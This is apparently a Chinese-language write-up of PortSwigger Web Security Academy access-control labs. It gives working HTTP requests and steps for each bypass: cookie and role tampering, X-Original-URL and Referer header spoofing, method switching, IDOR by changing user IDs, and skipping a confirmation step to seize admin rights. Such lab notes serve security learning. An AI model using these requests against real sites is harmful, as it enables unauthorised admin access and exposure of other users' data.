# Access control

[TOC]

## 1. Unprotected admin functionality

进入`/robots.txt`，发现不允许访问`/administrator-panel`，然后直接访问就好了。

访问之后删除carlos账户。

## 2. Unprotected admin functionality with unpredictable URL

这次的url猜不到，但是可以去js代码里面寻找。

```html
<script>
var isAdmin = false;
if (isAdmin) {
   var topLinksTag = document.getElementsByClassName("top-links")[0];
   var adminPanelTag = document.createElement('a');
   adminPanelTag.setAttribute('href', '/admin-thy42k');
   adminPanelTag.innerText = 'Admin panel';
   topLinksTag.append(adminPanelTag);
   var pTag = document.createElement('p');
   pTag.innerText = '|';
   topLinksTag.appendChild(pTag);
}
</script>
```

发现路径是`/admin-thy42k`。

可以直接进去，然后删除carlos。

## 3. User role controlled by request parameter

用给的账号先登录进去。

抓包后发现`Cookie: Admin=false; session=QX3aOPXjTQUbRbZxj8L7XQFH8QAjs0e7`。

将`Admin`改成`true`，（真就智商按在地上摩擦）。

然后就会发现网页上出现了`Admin panel`。

访问`admin`页面的时候也记得要改cookie。

删除账户的时候也要改cookie。

## 4. User role can be modified in user profile

> It's only accessible to logged-in users with a `roleid` of 2.

访问页面`/admin`，发现`Admin interface only available if logged in as an administrator`。

然后试了好多地方，添加roleid都没用。

当我去更改email的时候，终于在response里面看到了json格式的roleid。

```json
{
  "username": "wiener",
  "email": "aa@aa",
  "apikey": "qzbgMuPZobrRJoEmGuNflaxm4VkBRASs",
  "roleid": 1
}
```

然后用post方式访问admin，将roleid改成2。

```
Content-Type: application/json; charset=utf-8

{
  "username": "wiener",
  "email": "aa@aa",
  "apikey": "qzbgMuPZobrRJoEmGuNflaxm4VkBRASs",
  "roleid": 1
}
```

发现还是不行。

然后在提交`email`的那里，将roleid加入进去发现返回了`"roleid":2`。

然后发现就已经可以进入`/admin`了。

## 5. URL-based access control can be circumvented

> 一些应用框架支持各种非标准的HTTP头，可以用来覆盖原始请求中的URL，如X-Original-URL和X-Rewrite-URL。如果一个网站使用严格的前端控制来限制基于URL的访问，但应用程序允许通过请求头覆盖URL，那么可能会使用类似下面的请求来绕过访问控制。
>
> ```http
> POST / HTTP/1.1
> X-Original-URL: /admin/deleteUser
> ...
> ```

先用这个去访问`/admin`

```http
GET / HTTP/1.1
X-Original-URL: /admin
```

然后访问`/admin/delete?username=carlos`

```http
GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete
```

## 6. Method-based access control can be circumvented

这个只在POST请求中才拦截，GET并没有（感觉第二行是没用的）。

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
X-Original-URL: /admin
```

## 7. User ID controlled by request parameter

自己的网址是`/my-account?id=wiener`

尝试访问`/my-account?id=carlos`

直接搞定。

## 8. User ID controlled by request parameter, with unpredictable user IDs

这下无法猜测id了，但是可以在每篇文章的作者那里看到别人的id。

找到一个`<a href="/blogs?userId=08b0eebb-9110-4b5c-9500-b9f91dcde333">carlos</a>`

访问`/my-account?id=08b0eebb-9110-4b5c-9500-b9f91dcde333`

## 9. User ID controlled by request parameter with data leakage in redirect

访问`/my-account?id=carlos`，虽然给我弹回去了，但是我还是在报文里面看到了信息。

```html
Your username is: carlos
Your API Key is: 3pQpcmai2EPXZkH09iqqaSpZ3W6c3u2T
```

## 10. User ID controlled by request parameter with password disclosure

> To solve the lab, retrieve the administrator's password, then use it to delete `carlos`.

访问`/my-account?id=administrator`。

然后更改密码。发现直接改改的是`wiener`的密码。

再次访问`/my-account?id=administrator`，F12，直接看原本的密码是多少。

```html
<input required="" type="password" name="password" value="gdt4llkv44ew8s9q7n6v">
```

找到原本的密码是`gdt4llkv44ew8s9q7n6v`。

然后登陆`administrator`。

进去删除账号就好了。

## 11. Insecure direct object references

> This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs.

下载聊天记录发现序号是从2开始的，而且下载不需要权限。

尝试访问1.txt，发现这个聊天记录里面包含了别人的聊天记录，里面还有密码。

直接拿去登陆就好了。

## 12. Multi-step process with no access control on one step

这个题改权限之前本来是有验证的，但是这个可以跳过验证。

```http
POST /admin-roles HTTP/1.1
Host: ac391f1a1fc00f0080c0d9aa00a00055.web-security-academy.net
Content-Length: 45
Content-Type: application/x-www-form-urlencoded
Cookie: session=VYZQHDNezoPo6TIXbhOIZ8LL3Bc0Hb2Y

action=upgrade&confirmed=true&username=wiener
```

## 13. Referer-based access control

这个在更改权限的时候只检查Referer头。

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: ac4f1f611fb5d456804e0342005b0057.web-security-academy.net
Referer: https://ac4f1f611fb5d456804e0342005b0057.web-security-academy.net/admin
Cookie: session=vCUWceknSdBbLlqCLTpqwrTRjvVCTsGh
```

